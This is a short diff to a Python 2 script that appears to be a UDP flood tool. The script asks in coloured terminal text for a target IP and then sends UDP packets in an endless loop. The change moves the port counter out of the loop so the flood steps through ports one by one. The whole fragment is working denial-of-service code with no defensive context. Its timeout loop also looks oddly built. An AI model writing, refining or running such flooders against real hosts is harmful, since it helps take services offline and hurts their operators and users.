@@ -21,13 +21,13 @@ print ("""
 """);
 ip = raw_input("\033[1;33;40mIP: \033[1;36;40m");
 sent = 0;
+port = 1;
 while True:
      while 1:
         if time.time() > timeout:
             break;
         else:
             pass;
-     port = 1;
      sock.sendto(bytes, (ip, port));
      sent = sent + 1;
      port = port + 1;
